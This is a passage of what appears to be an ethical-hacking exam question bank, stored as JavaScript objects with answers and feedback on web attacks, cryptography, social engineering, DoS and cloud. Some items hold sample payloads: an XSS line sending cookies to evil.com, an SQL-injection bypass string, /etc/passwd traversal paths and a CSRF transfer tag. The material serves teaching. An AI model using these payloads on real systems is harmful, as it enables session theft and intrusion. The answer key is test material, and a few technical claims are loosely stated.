wrong_fb:'<strong>WPA2-Personal = PSK (crackable with dictionary)</strong>. <strong>WPA2-Enterprise = 802.1X + EAP + RADIUS (much stronger)</strong>. WPA2 uses AES-CCMP (not RC4 like WEP/WPA). WPA2 is vulnerable to: PMKID attack (offline cracking without full handshake), KRACK (key reinstallation, patched), and dictionary attacks against weak PSKs. WPA3 addresses many WPA2 weaknesses with SAE (Simultaneous Authentication of Equals).'},

{topic:6,diff:'medium',type:'Multiple Choice',
q:'What does the Reaver tool specifically attack?',
opts:['WEP encryption keys using IV collection','WPA2 4-way handshakes using deauthentication','WPS (Wi-Fi Protected Setup) PIN using brute-force','Bluetooth devices using bluejacking'],
ans:2,hint:'This attack targets a convenience feature designed to simplify device pairing.',
correct_fb:'<strong>Reaver</strong> brute-forces the <strong>WPS (Wi-Fi Protected Setup) PIN</strong>. WPS uses an 8-digit PIN, but due to a design flaw, it\'s effectively only 11,000 combinations (the PIN is verified in two halves). Reaver can crack WPS in 4-10 hours. Mitigation: disable WPS on all routers. Many router manufacturers patched this by adding rate limiting or permanent lockout after failed attempts.',
wrong_fb:'<strong>Reaver = WPS PIN brute-force</strong>. The WPS PIN has a design flaw: the router verifies the first 4 digits and last 4 digits separately, reducing combinations from 100 million to ~11,000. Reaver exploits this. WPS should be disabled on all routers. Note: some newer implementations lock after multiple failures (rate limiting)  --  Reaver may be slow or blocked on patched routers.'},

{topic:6,diff:'easy',type:'Multiple Choice',
q:'What is war driving?',
opts:['Attacking wireless networks while inside a moving vehicle','Driving around in a vehicle to discover and map wireless networks using a wireless adapter and GPS','Cracking WPA2 passwords while mobile','Jamming wireless signals from a moving vehicle'],
ans:1,hint:'War + driving = discovering networks while driving.',
correct_fb:'<strong>War driving</strong> involves driving around with a wireless adapter in monitor mode (and typically GPS) to discover, map, and record nearby wireless networks. Tools: Kismet (Linux), Wardriving apps, Wigle.net (for uploading/mapping results). War driving is primarily passive reconnaissance. War walking = same thing on foot. War flying = from aircraft. Discovered data includes SSID, encryption type, MAC address, and signal strength.',
wrong_fb:'<strong>War driving = mobile wireless network discovery</strong>. The goal is passive reconnaissance: identify wireless networks, their encryption type, SSID, and location. Tools: Kismet, InSSIDer, WiFi Analyzer. War chalking = marking discovered networks on sidewalks. War walking = on foot. The collected data is often uploaded to Wigle.net  --  a global map of wireless networks. This is legal in most jurisdictions unless you attempt to connect.'},

// -- TOPIC 7: Web Application Attacks --
{topic:7,diff:'easy',type:'Multiple Choice',
q:'What is SQL injection (SQLi) and what is the primary defense against it?',
opts:['Injecting malicious scripts into web pages; defense is HTTPS','Inserting malicious SQL code into input fields to manipulate a database; defense is parameterized queries/prepared statements','Sending malformed HTTP headers to crash web servers; defense is a WAF','Brute-forcing database passwords; defense is strong password policy'],
ans:1,hint:'The attack targets the database through unsanitized input fields.',
correct_fb:'<strong>SQL injection</strong> inserts malicious SQL code into input fields that are directly concatenated into database queries. Example: entering "1\' OR \'1\'=\'1" as a login bypasses authentication. Impacts: authentication bypass, data extraction, data modification, command execution. <strong>Primary defense: parameterized queries (prepared statements)</strong>  --  the SQL structure is fixed; user input is always treated as data, never as SQL code.',
wrong_fb:'<strong>SQL injection = manipulating database queries through unsanitized input</strong>. Defenses (in order of effectiveness): (1) Parameterized queries/prepared statements (best), (2) Stored procedures, (3) Input validation/whitelist, (4) WAF (Web Application Firewall  --  supplementary only). Types of SQLi: Classic (in-band), Blind (boolean/time-based), Out-of-band. Tool: sqlmap automates SQLi discovery and exploitation.'},

{topic:7,diff:'medium',type:'Multiple Choice',
q:'What is Cross-Site Scripting (XSS), and how does it differ from SQL injection?',
opts:['XSS attacks databases; SQLi attacks browsers  --  they affect different targets','XSS injects malicious scripts into web pages viewed by other users; SQLi injects SQL into database queries  --  XSS targets users, SQLi targets the database','XSS and SQLi are the same attack with different names','XSS requires physical access; SQLi does not'],
ans:1,hint:'One targets the database behind the app; one targets other users\' browsers.',
correct_fb:'<strong>XSS (Cross-Site Scripting)</strong> injects malicious JavaScript into web pages that are then executed in other users\' browsers  --  targeting users, not the server. <strong>SQLi</strong> targets the backend database. XSS types: <strong>Stored XSS</strong> (persistent, stored in DB), <strong>Reflected XSS</strong> (in URL, triggers on click), <strong>DOM-based XSS</strong> (exploits client-side DOM). XSS can steal cookies/sessions, redirect users, or perform actions on their behalf.',
wrong_fb:'<strong>XSS = malicious script in victim\'s browser</strong>. SQLi = malicious SQL in backend database. Defense against XSS: output encoding (HTML-encode user-supplied data), Content Security Policy (CSP), HttpOnly cookies (prevent JS from reading cookies). Defense against SQLi: parameterized queries. Both are in the OWASP Top 10. XSS steals cookies -> session hijacking -> account takeover.'},

{topic:7,diff:'hard',type:'Multiple Choice',
q:'An attacker sends the URL: http://victim.com/search?q=\u003cscript\u003edocument.location=\'http://evil.com/steal?cookie=\'+document.cookie\u003c/script\u003e to a victim via email. What type of XSS attack is this?',
opts:['Stored XSS','Reflected XSS','DOM-based XSS','CSRF'],
ans:1,hint:'The script is in the URL and reflects back to the victim\'s browser when they click the link.',
correct_fb:'This is <strong>Reflected XSS</strong> (non-persistent): the malicious script is embedded in the URL and "reflected" back by the server in its response. When the victim clicks the link, the script executes in their browser, stealing the session cookie and sending it to the attacker\'s server. The server doesn\'t store the script  --  it simply echoes unsanitized input. Prevention: input validation, output encoding, CSP headers.',
wrong_fb:'<strong>Reflected XSS = script in URL, reflected in response</strong>. Stored XSS = script saved in database (shown to all users viewing that page). DOM-based XSS = script executed via client-side DOM manipulation (no server involvement). CSRF = forces authenticated user\'s browser to make requests. The cookie theft script shown (document.location + document.cookie) is the classic reflected XSS payload on the CEH exam.'},

{topic:7,diff:'medium',type:'Multiple Choice',
q:'What is CSRF (Cross-Site Request Forgery) and how does it work?',
opts:['Stealing cookies by injecting scripts into web pages','Tricking an authenticated user\'s browser into making unauthorized requests to a trusted site','Forging digital certificates for HTTPS interception','Bypassing authentication using SQL injection'],
ans:1,hint:'The attack uses the victim\'s existing authenticated session to make requests they didn\'t intend.',
correct_fb:'<strong>CSRF</strong> tricks an authenticated user\'s browser into making requests to a trusted site without their knowledge. If Alice is logged into her bank, an attacker\'s page can include: <img src="http://bank.com/transfer?amount=1000&to=attacker">. Alice\'s browser sends the request with her valid session cookie. The bank executes it. Prevention: CSRF tokens (unique per-request values), SameSite cookie attribute, checking Origin/Referer headers.',
wrong_fb:'<strong>CSRF = unauthorized actions using victim\'s authenticated session</strong>. The attacker doesn\'t steal credentials  --  they abuse the victim\'s existing login. CSRF requires: victim is authenticated, attack uses GET/POST to perform actions, server doesn\'t validate request origin. Defense: CSRF tokens (random value in forms verified server-side), SameSite cookie attribute, double-submit cookie pattern. Different from XSS which executes JavaScript in the victim\'s browser.'},

{topic:7,diff:'hard',type:'Multiple Choice',
q:'What is a directory traversal (path traversal) attack?',
opts:['Enumerating directory listings from a web server\'s public index','Using "../" sequences in URLs or parameters to access files outside the web root','Discovering hidden directories using brute-force tools','Modifying directory permissions on a web server'],
ans:1,hint:'Think about what "../" means in a file path  --  it moves UP one directory.',
correct_fb:'<strong>Directory traversal</strong> uses "../" sequences to navigate outside the intended directory. Example: http://victim.com/page?file=../../../etc/passwd retrieves the Linux password file. If the application doesn\'t sanitize "../" in user input, an attacker can read any file readable by the web server process. Prevention: input validation, canonicalize paths before use, use chroot jails, least privilege for web server process.',
wrong_fb:'<strong>Directory traversal = escape web root using ../</strong>. Classic payload: "../../../../etc/passwd" (Linux) or "..\\..\\windows\\system32\\drivers\\etc\\hosts" (Windows). Also called "path traversal" or "dot-dot-slash attack." Detection tool: nikto, OWASP ZAP, Burp Suite. Prevention: never pass file paths from user input directly to file system calls; canonicalize and whitelist allowed paths.'},

{topic:7,diff:'easy',type:'Multiple Choice',
q:'What is the purpose of a Web Application Firewall (WAF)?',
opts:['To encrypt all web application traffic','To filter and monitor HTTP traffic between users and web applications, blocking common attacks like SQLi and XSS','To manage SSL certificates for web applications','To load-balance traffic across multiple web servers'],
ans:1,hint:'WAF is specifically for web application traffic  --  it understands HTTP.',
correct_fb:'A <strong>WAF (Web Application Firewall)</strong> inspects HTTP/HTTPS traffic and blocks common web attacks: SQLi, XSS, CSRF, directory traversal, and more. Unlike traditional firewalls (which filter at L3/L4), WAFs operate at Layer 7 (application layer). They can use signature-based detection, anomaly detection, and allow/deny lists. Examples: AWS WAF, Cloudflare WAF, ModSecurity. WAFs supplement  --  but don\'t replace  --  secure coding practices.',
wrong_fb:'<strong>WAF = Layer 7 application firewall for HTTP traffic</strong>. Blocks: SQLi, XSS, CSRF, directory traversal, HTTP floods. WAF is NOT a substitute for secure coding (parameterized queries, output encoding). WAFs can be bypassed by sophisticated attackers using evasion techniques (encoding, case variation). Network firewalls = L3/L4 (IP/port). WAF = L7 (HTTP content inspection). The CEH exam tests what WAFs protect against and their limitations.'},

// -- TOPIC 8: Cryptography --
{topic:8,diff:'easy',type:'Multiple Choice',
q:'What is the difference between symmetric and asymmetric encryption?',
opts:['Symmetric uses two different keys; asymmetric uses one key','Symmetric uses one key for both encryption and decryption; asymmetric uses a key pair (public + private)','Symmetric is slower than asymmetric; asymmetric is faster','Symmetric is used for authentication; asymmetric is used for data encryption only'],
ans:1,hint:'Think about how many keys are involved in each system.',
correct_fb:'<strong>Symmetric encryption</strong>: single shared key for both encryption and decryption (fast, efficient for bulk data). Examples: AES, DES, 3DES, RC4, Blowfish. Problem: key distribution (how to securely share the key). <strong>Asymmetric encryption</strong>: key pair  --  public key (encrypt) + private key (decrypt). Examples: RSA, ECC, Diffie-Hellman. Slower but solves key distribution. Used for key exchange and digital signatures.',
wrong_fb:'<strong>Symmetric = one shared key (fast)</strong>. <strong>Asymmetric = key pair: public + private (slow but solves key exchange)</strong>. In practice: asymmetric is used to exchange a symmetric session key (hybrid encryption). Example: TLS uses RSA/ECC to exchange an AES session key, then AES for bulk data. Symmetric algorithms: AES (gold standard), 3DES (legacy), RC4 (broken). Asymmetric: RSA, ECC, Diffie-Hellman, ElGamal.'},

{topic:8,diff:'medium',type:'Multiple Choice',
q:'Which hashing algorithm produces a 128-bit digest and is considered cryptographically broken?',
opts:['SHA-256','SHA-1','MD5','SHA-3'],
ans:2,hint:'This was the dominant hashing algorithm of the 1990s-2000s and is now broken.',
correct_fb:'<strong>MD5 (Message Digest 5)</strong> produces a 128-bit hash and is cryptographically broken  --  collision attacks are feasible (two different inputs producing the same hash). MD5 should NOT be used for security purposes: password storage, digital signatures, or file integrity verification for security. It may still be used for non-security checksums. SHA-256 or SHA-3 should be used instead.',
wrong_fb:'<strong>MD5 = 128-bit hash, cryptographically broken</strong>. SHA-1 = 160-bit, also broken (deprecated by major browsers in 2017). SHA-256 = 256-bit, currently secure. SHA-3 = newest standard, different internal design. For passwords: use bcrypt, scrypt, or Argon2 (not any SHA or MD5 directly). Hash sizes: MD5=128, SHA-1=160, SHA-256=256, SHA-512=512. The CEH exam tests which algorithms are broken.'},

{topic:8,diff:'hard',type:'Multiple Choice',
q:'In PKI, what is the role of a Certificate Authority (CA)?',
opts:['To encrypt all traffic between users and websites','To issue, sign, and revoke digital certificates that bind public keys to identities','To generate private keys for all users in the organization','To perform the actual encryption of HTTPS sessions'],
ans:1,hint:'The CA is the trusted third party that validates identities.',
correct_fb:'A <strong>CA (Certificate Authority)</strong> is a trusted entity that: (1) verifies the identity of certificate requesters, (2) issues digital certificates binding a public key to an identity, (3) signs certificates with its own private key (creating trust), (4) maintains a CRL (Certificate Revocation List) for revoked certificates, and (5) operates OCSP (Online Certificate Status Protocol) for real-time revocation checking.',
wrong_fb:'<strong>CA = issues and signs digital certificates</strong>. PKI hierarchy: Root CA (most trusted, offline) -> Intermediate CA -> End-entity certificates. Certificate fields: Subject (who it\'s for), Issuer (CA name), Public Key, Valid dates, Serial number, Extensions, CA\'s digital signature. CRL = list of revoked certs. OCSP = real-time revocation check. Self-signed certificates are not trusted by browsers without manual installation.'},

{topic:8,diff:'medium',type:'Multiple Choice',
q:'What is a Man-in-the-Middle (MITM) attack in the context of cryptography?',
opts:['An attacker guessing encryption keys through brute force','An attacker intercepting communications between two parties, potentially decrypting and re-encrypting traffic without either party knowing','An attacker modifying encrypted files directly','An attacker impersonating a Certificate Authority'],
ans:1,hint:'The attacker positions themselves between the two communicating parties.',
correct_fb:'In a <strong>MITM attack</strong>, the attacker intercepts communications between Alice and Bob, becoming a proxy: Alice   Attacker   Bob. If properly positioned (via ARP spoofing, DNS poisoning, evil twin AP), the attacker can read and modify traffic. Against SSL/TLS: tools like sslstrip downgrade HTTPS to HTTP; mitmproxy and Burp Suite can intercept HTTPS if the victim accepts the attacker\'s forged certificate.',
wrong_fb:'<strong>MITM = attacker intercepts and potentially modifies traffic between two parties</strong>. Enablers: ARP spoofing, DNS poisoning, rogue AP/evil twin, BGP hijacking. Against HTTPS: certificate pinning prevents MITM (rejects unexpected certificates); HSTS forces HTTPS and prevents downgrade. Detection: certificate warnings (unexpected CA), ARP cache inspection, network monitoring for unusual traffic patterns.'},

{topic:8,diff:'hard',type:'Multiple Choice',
q:'What does "perfect forward secrecy" (PFS) provide in cryptographic protocols?',
opts:['Ensures that encrypted messages cannot be read even by the sender after 24 hours','Ensures that compromise of long-term private keys does not compromise past session keys  --  each session uses unique ephemeral keys','Provides encryption that is perfect in all forward directions of communication','Automatically rotates encryption keys every 60 seconds'],
ans:1,hint:'Think about what happens if an attacker records encrypted traffic today and later steals the private key.',
correct_fb:'<strong>Perfect Forward Secrecy (PFS)</strong> ensures that even if a server\'s long-term private key is later compromised, past session keys cannot be derived. Each session uses <strong>ephemeral key exchange</strong> (DHE or ECDHE)  --  the session key is never transmitted and is discarded after the session. Without PFS: attacker records HTTPS traffic, later obtains private key, decrypts everything. With PFS: recorded traffic remains encrypted.',
wrong_fb:'<strong>PFS = ephemeral session keys, compromise of long-term key doesn\'t expose past sessions</strong>. Implemented with: DHE (Diffie-Hellman Ephemeral) or ECDHE (Elliptic Curve DHE). TLS 1.3 mandates PFS  --  only ECDHE key exchange is supported. TLS 1.2 supports PFS optionally. Configure web servers to prefer ECDHE cipher suites. Without PFS, a stolen private key unlocks all previously recorded encrypted sessions.'},

{topic:8,diff:'easy',type:'Multiple Choice',
q:'What is the purpose of a digital signature?',
opts:['To encrypt a message so only the recipient can read it','To provide authentication and non-repudiation  --  proving who sent a message and that it hasn\'t been altered','To compress data for efficient transmission','To generate a shared secret between two parties'],
ans:1,hint:'A signature proves identity and integrity  --  the same purposes as a handwritten signature.',
correct_fb:'A <strong>digital signature</strong> provides: (1) <strong>Authentication</strong>  --  proves the sender\'s identity (signed with their private key), (2) <strong>Integrity</strong>  --  any modification to the message invalidates the signature, (3) <strong>Non-repudiation</strong>  --  the sender cannot deny sending the message. Process: sender hashes the message, encrypts the hash with their private key (the signature), receiver decrypts with sender\'s public key and compares hashes.',
wrong_fb:'<strong>Digital signature = authentication + integrity + non-repudiation</strong>. Process: Hash(message) -> encrypt hash with private key = signature. Recipient: decrypt signature with public key -> compare to Hash(received message). If equal: message is authentic and unmodified. Note: digital signatures do NOT encrypt the message content (that uses the recipient\'s public key for encryption). Combine both for signed AND encrypted messages.'},

// -- TOPIC 9: Social Engineering --
{topic:9,diff:'easy',type:'Multiple Choice',
q:'What is social engineering in the context of cybersecurity?',
opts:['Hacking into social media platforms','Manipulating people through psychological deception to reveal confidential information or perform actions that compromise security','Engineering secure social media APIs','Monitoring employee social media for security threats'],
ans:1,hint:'The "engineering" is psychological manipulation of human behavior, not technical.',
correct_fb:'<strong>Social engineering</strong> exploits human psychology rather than technical vulnerabilities. It\'s often easier to trick a person than to hack a system. Key principles exploited: authority, urgency, social proof, reciprocity, liking, and scarcity. Kevin Mitnick famously stated: "The human element is the weakest link in security." Technical defenses are worthless if employees can be manipulated into bypassing them.',
wrong_fb:'<strong>Social engineering = manipulating humans, not systems</strong>. The attacker targets human trust, fear, urgency, and authority rather than software vulnerabilities. Kevin Mitnick: "The weakest link in any security chain is the human element." Types: phishing, vishing (voice), smishing (SMS), pretexting, baiting, tailgating/piggybacking, quid pro quo, impersonation. Defense: security awareness training.'},

{topic:9,diff:'medium',type:'Multiple Choice',
q:'What is spear phishing, and how does it differ from regular phishing?',
opts:['Spear phishing targets fish in the ocean; regular phishing targets humans','Spear phishing is a highly targeted attack using personalized information about the victim; regular phishing sends generic emails to large groups','Spear phishing only uses text messages; regular phishing uses email','Spear phishing is automated; regular phishing is manual'],
ans:1,hint:'A spear is precise; a fishing net is wide  --  apply the same analogy to targeting.',
correct_fb:'<strong>Spear phishing</strong> is a <strong>targeted, personalized</strong> attack using research about the specific victim (name, job title, colleagues, recent activities from LinkedIn/social media) to craft convincing messages. <strong>Regular phishing</strong> sends generic, mass emails hoping some percentage will fall for them. Spear phishing success rates are dramatically higher due to personalization. Whaling = spear phishing targeting executives (C-suite).',
wrong_fb:'<strong>Spear phishing = targeted + personalized</strong>. Regular phishing = generic + mass. Variants: Whaling (targeting executives), Vishing (voice calls), Smishing (SMS texts), Pharming (redirect DNS). Research sources for spear phishing: LinkedIn (job title, colleagues), Twitter/social media (interests, recent activities), company website (org chart), press releases, public records. Always verify unexpected requests through a different channel.'},

{topic:9,diff:'hard',type:'Multiple Choice',
q:'What is pretexting in social engineering?',
opts:['Sending malicious links in text messages','Creating a fabricated scenario (pretext) to manipulate a target into revealing information or performing actions','Analyzing pre-existing security policies for weaknesses','Testing security controls before an official pen test'],
ans:1,hint:'A "pretext" is a false reason or story created to justify something.',
correct_fb:'<strong>Pretexting</strong> involves creating a fabricated scenario (pretext) to manipulate the target. Examples: "I\'m from IT support and need your password to fix your account," "I\'m a new employee and forgot my badge  --  can you let me in?" or "I\'m from the IRS and there\'s a warrant for your arrest." The attacker researches the target to make the pretext convincing. This is the foundation of most social engineering attacks.',
wrong_fb:'<strong>Pretexting = fabricated scenario to justify the request</strong>. The attacker invents a plausible cover story. Classic pretexts: IT support needing credentials, new employee needing building access, vendor delivering packages, IRS/law enforcement creating fear. Phone-based pretexting (vishing) is extremely effective because humans naturally trust voices. Defense: verify identity through official channels, never bypass security for convenience.'},

{topic:9,diff:'medium',type:'Multiple Choice',
q:'What is tailgating (piggybacking) as a social engineering technique?',
opts:['Following someone\'s online activity on social media without their knowledge','Physically following an authorized person through a secured door without using one\'s own credentials','Intercepting email traffic from a targeted executive','Installing a keylogger on an executive\'s computer while they\'re away'],
ans:1,hint:'Think about what "tailgating" means in traffic  --  following too closely.',
correct_fb:'<strong>Tailgating (piggybacking)</strong> involves physically following an authorized employee through a secured door  --  exploiting their politeness (holding the door) to gain unauthorized physical access. Distinction: <strong>tailgating</strong> = employee doesn\'t know they\'re enabling it (attacker follows closely); <strong>piggybacking</strong> = employee knowingly allows it (attacker provides fake excuse). Prevention: security guards, mantraps, turnstiles, and security awareness training.',
wrong_fb:'<strong>Tailgating = physical unauthorized access by following authorized person</strong>. Prevention: mantraps (double-door entry systems that only allow one person at a time), security guards who enforce badge requirements, and security awareness training (teaching employees it\'s acceptable to question unknown individuals). "Door holding" is a social courtesy that attackers exploit. Always verify identity before allowing physical access.'},

{topic:9,diff:'easy',type:'Multiple Choice',
q:'Which social engineering attack uses SMS text messages as the delivery mechanism?',
opts:['Phishing','Vishing','Smishing','Pharming'],
ans:2,hint:'SMS + phishing = a portmanteau name.',
correct_fb:'<strong>Smishing</strong> (SMS phishing) uses text messages to deceive victims  --  sending fake alerts about bank accounts, package deliveries, or prizes with malicious links. Mobile users often click SMS links more readily than email links, and mobile browsers make it harder to inspect URLs. Vishing = voice/phone call phishing. Pharming = DNS-level redirect to fake websites (no email/SMS needed).',
wrong_fb:'<strong>Smishing = SMS phishing</strong>. Phishing = email. Vishing = voice (phone calls). Pharming = DNS poisoning to redirect legitimate domains. Whaling = targeting executives via phishing. Clone phishing = copying a legitimate email and replacing links with malicious ones. Angler phishing = fake customer service on social media. SMS-based attacks are increasingly common because people trust text messages more than emails.'},

{topic:9,diff:'hard',type:'Multiple Choice',
q:'What psychological principle does an attacker exploit when they say "I need you to do this right now  --  your CEO is on the phone waiting"?',
opts:['Reciprocity','Social proof','Urgency and authority combined','Scarcity'],
ans:2,hint:'The attacker is applying pressure using time and rank simultaneously.',
correct_fb:'This exploits <strong>urgency</strong> (do it RIGHT NOW  --  creates panic, bypasses rational thinking) AND <strong>authority</strong> (CEO is watching  --  people comply with authority figures). Combined, these are extremely powerful. Cialdini\'s 6 principles of influence: Reciprocity, Commitment/Consistency, Social Proof, Authority, Liking, Scarcity. Social engineering attacks craft scenarios to hit multiple principles simultaneously for maximum compliance.',
wrong_fb:'<strong>Urgency + Authority = two of the most powerful social engineering triggers</strong>. Urgency: "right now, immediately" -> bypasses careful thinking. Authority: "CEO, manager, IT department, law enforcement" -> people naturally defer to authority. Cialdini\'s principles: Reciprocity (do a favor, expect one back), Social Proof (others are doing it), Scarcity (limited time/quantity), Liking (we comply with people we like), Consistency, Authority. Defense: pause, verify through official channels.'},

// -- TOPIC 10: DoS & Session Hijacking --
{topic:10,diff:'easy',type:'Multiple Choice',
q:'What is a Distributed Denial of Service (DDoS) attack?',
opts:['An attack where a single machine floods a target with traffic','An attack using thousands of compromised machines (botnet) simultaneously flooding a target, overwhelming its resources','An attack that disrupts DNS to redirect traffic','An attack that crashes a server by exploiting a software vulnerability'],
ans:1,hint:'Distributed = many sources attacking simultaneously.',
correct_fb:'A <strong>DDoS attack</strong> uses a <strong>botnet</strong> (network of compromised machines/zombies controlled via C2) to simultaneously flood a target with traffic, overwhelming its bandwidth, CPU, or connection table. The "distributed" nature makes blocking difficult  --  traffic comes from thousands of different IPs. Types: volumetric (bandwidth flooding), protocol (SYN flood, Ping of Death), application layer (HTTP flood, Slowloris).',
wrong_fb:'<strong>DDoS = many sources (botnet) overwhelming target simultaneously</strong>. DoS = single source. DDoS types: Volumetric (UDP/ICMP flood, DNS amplification), Protocol (SYN flood exploiting TCP handshake, ICMP flood), Application layer (HTTP GET flood, Slowloris, slow POST). DDoS mitigation: Anycast diffusion, rate limiting, blackholing, scrubbing centers (Cloudflare, Akamai), CAPTCHA challenges.'},

{topic:10,diff:'medium',type:'Multiple Choice',
q:'How does a SYN flood attack work?',
opts:['Sends oversized ICMP packets to crash the target','Sends thousands of SYN packets with spoofed source IPs, consuming the target\'s connection table without completing handshakes','Fragments TCP packets to bypass firewall inspection','Injects malformed HTTP headers to crash the web server'],
ans:1,hint:'The attack exploits the stateful nature of TCP\'s three-way handshake.',
correct_fb:'A <strong>SYN flood</strong> sends thousands of TCP SYN packets with <strong>spoofed source IP addresses</strong>. The server sends SYN-ACK replies and allocates memory waiting for the final ACK that never arrives (because the source IPs are fake). Eventually the connection table (backlog queue) fills up, and legitimate connections are rejected. Mitigation: SYN cookies (server doesn\'t allocate memory until handshake completes), rate limiting, firewalls.',
wrong_fb:'<strong>SYN flood = half-open connection exhaustion</strong>. Server allocates resources (memory, connection table entry) for each SYN, sends SYN-ACK, waits for ACK that never comes. With spoofed IPs, the server can\'t identify the attacker. SYN cookie mitigation: instead of allocating memory, the server encodes state in the TCP sequence number  --  only allocates resources after receiving the final ACK. This effectively neutralizes SYN floods.'},

{topic:10,diff:'hard',type:'Multiple Choice',
q:'What is session hijacking, and which is the most common method used in web application session hijacking?',
opts:['Taking over a user\'s entire operating system remotely; most common method is keylogging','Taking over an authenticated web session by obtaining the session token; most common method is cookie theft (XSS-based)','Resetting a victim\'s password remotely; most common method is phishing','Intercepting encrypted HTTPS sessions; most common method is SSL stripping'],
ans:1,hint:'Once authenticated, web apps track sessions with a token  --  steal the token, steal the session.',
correct_fb:'<strong>Session hijacking</strong> takes over an authenticated web session by stealing the <strong>session token/cookie</strong>. Most common method: <strong>XSS</strong> (inject JavaScript that reads document.cookie and sends it to attacker). Once the attacker has the session cookie, they can impersonate the victim without knowing their password. Prevention: HttpOnly cookies (JavaScript can\'t read them), Secure flag (HTTPS only), short session timeouts, session ID regeneration after login.',
wrong_fb:'<strong>Session hijacking = steal session token -> impersonate authenticated user</strong>. Methods: XSS (steal cookie via JavaScript), network sniffing (HTTP sessions unencrypted), man-in-the-middle, packet injection. Defenses: HttpOnly cookies (no JS access), Secure attribute (HTTPS only), SameSite cookie attribute, short timeouts, bind session to IP/User-Agent, token regeneration after login. Firesheep (2010) famously demonstrated coffee shop session hijacking over HTTP.'},

{topic:10,diff:'medium',type:'Multiple Choice',
q:'What is a Slowloris attack, and how does it differ from a SYN flood?',
opts:['Both attacks exploit the same TCP handshake vulnerability','Slowloris is a Layer 7 attack that opens many HTTP connections and sends partial headers slowly, exhausting the web server\'s connection limit  --  unlike SYN flood which is Layer 3/4','Slowloris uses UDP while SYN flood uses TCP','Slowloris requires a botnet; SYN flood can be done from one machine'],
ans:1,hint:'Slow and low is the key  --  this attack doesn\'t use much bandwidth.',
correct_fb:'<strong>Slowloris</strong> is an application-layer (Layer 7) HTTP DoS tool that opens many connections to a web server and sends <strong>partial HTTP headers very slowly</strong>, never completing the request. The server keeps each connection open waiting for the headers to finish. Eventually the server\'s connection limit is exhausted and legitimate requests are dropped. Very low bandwidth required  --  one machine can DoS a server. Mitigation: connection limits per IP, request timeouts, reverse proxies.',
wrong_fb:'<strong>Slowloris = slow HTTP attack, Layer 7, minimal bandwidth</strong>. vs SYN flood = Layer 4, requires more bandwidth. Slowloris just needs to maintain many concurrent connections with partial headers. Mitigation: timeout incomplete requests quickly, limit connections per IP, use reverse proxy/WAF that terminates connections (nginx handles Slowloris naturally). Created by RSnake, Slowloris targets Apache web servers specifically (nginx is largely immune by design).'},

{topic:10,diff:'easy',type:'Multiple Choice',
q:'Which tool is associated with performing Slowloris DoS attacks?',
opts:['Aircrack-ng','LOIC (Low Orbit Ion Cannon)','Slowloris (by RSnake)','Metasploit'],
ans:2,hint:'The tool is named after the attack  --  a slow-moving primate.',
correct_fb:'The <strong>Slowloris</strong> tool (written by RSnake/Robert Hansen) implements the slow HTTP attack targeting Apache web servers. <strong>LOIC (Low Orbit Ion Cannon)</strong> is a different DoS tool  --  it performs volumetric attacks (UDP/TCP/HTTP floods) and was famously used by Anonymous. Metasploit includes DoS modules but is primarily an exploitation framework. Aircrack-ng is for wireless attacks.',
wrong_fb:'<strong>Slowloris = the tool AND the attack type</strong>. Other DoS tools: LOIC (volumetric, UDP/TCP/HTTP flood), HOIC (High Orbit Ion Cannon, improved LOIC), hping3 (SYN floods, custom packets), Metasploit auxiliary DoS modules. LOIC was used by "hacktivist" groups like Anonymous. Most DoS attacks from a single machine are easily mitigated  --  DDoS using botnets is far more difficult to defend against.'},

// -- TOPIC 11: Cloud & IoT Security --
{topic:11,diff:'easy',type:'Multiple Choice',
q:'In cloud computing, what does "IaaS" provide to customers?',
opts:['Complete applications ready for users','Development platforms and runtime environments','Virtualized computing infrastructure (servers, storage, networking) managed by the provider','Only network connectivity to on-premises servers'],
ans:2,hint:'Infrastructure = the hardware and network layer  --  everything physical.',
correct_fb:'<strong>IaaS (Infrastructure as a Service)</strong>: provider manages hardware, hypervisor, storage, and networking. Customer manages OS, middleware, runtime, and applications. Example: Amazon EC2, Azure VMs, Google Compute Engine. <strong>PaaS</strong>: provider manages up through runtime/middleware; customer manages applications and data. <strong>SaaS</strong>: provider manages everything; customer only uses the application. Example: Gmail, Office 365, Salesforce.',
wrong_fb:'Cloud service models: <strong>IaaS</strong> = virtual machines, storage, networking (AWS EC2, Azure VMs). <strong>PaaS</strong> = development platforms (Heroku, Google App Engine). <strong>SaaS</strong> = complete applications (Salesforce, Office 365, Gmail). Responsibility: IaaS -> customer manages OS up. PaaS -> customer manages app + data only. SaaS -> customer manages nothing (just uses it). Memorize this layered responsibility model for the CEH exam.'},

{topic:11,diff:'medium',type:'Multiple Choice',
q:'What is FedRAMP, and why is it significant for cloud security?',
opts:['A private cloud standard for financial institutions','A government-wide program providing standardized security assessment and authorization for cloud products used by US federal agencies','A European cloud security certification program','An open-source framework for testing cloud application security'],
ans:1,hint:'FedRAMP = Federal Risk and Authorization Management Program.',
correct_fb:'<strong>FedRAMP</strong> is a US government-wide program that provides a <strong>standardized approach to security assessment, authorization, and continuous monitoring</strong> for cloud products and services used by federal agencies. Developed collaboratively by GSA, NIST, DHS, DoD, NSA, and OMB. If a cloud service is FedRAMP authorized, all federal agencies can use it without separate security reviews  --  "authorize once, use many times."',
wrong_fb:'<strong>FedRAMP = federal government cloud security framework</strong>. Developed by GSA, NIST, DHS, DoD  --  the major US cybersecurity agencies. Cloud providers must pass rigorous security assessments to achieve FedRAMP authorization. Once authorized, all federal agencies can adopt the service. Other cloud security frameworks: CSA (Cloud Security Alliance), ISO 27017 (cloud-specific ISO standard), SOC 2 (service organization controls), NIST SP 800-144.'},

{topic:11,diff:'medium',type:'Multiple Choice',
q:'Which cloud deployment model is used when multiple organizations with similar regulatory requirements share cloud infrastructure?',
opts:['Public cloud','Private cloud','Community cloud','Hybrid cloud'],
ans:2,hint:'Multiple organizations with similar needs sharing infrastructure = a community sharing it.',
correct_fb:'A <strong>community cloud</strong> is shared infrastructure used by several organizations with <strong>similar policy, compliance, or security requirements</strong> (e.g., multiple government agencies, healthcare providers, or financial institutions). It can be managed by the organizations themselves or a third-party provider. Costs are shared, and security requirements are aligned. Example: state government agencies sharing a common cloud environment.',
wrong_fb:'Cloud deployment models: <strong>Public</strong> (open to anyone, provider manages all, pay-as-you-go), <strong>Private</strong> (single organization, most control), <strong>Community</strong> (shared among organizations with similar requirements), <strong>Hybrid</strong> (combination of public + private with orchestration). Community cloud balances cost sharing (like public) with specialized security controls (like private) for organizations with common compliance needs.'},

{topic:11,diff:'hard',type:'Multiple Choice',
q:'What is a cloud-specific attack known as "VM escape"?',
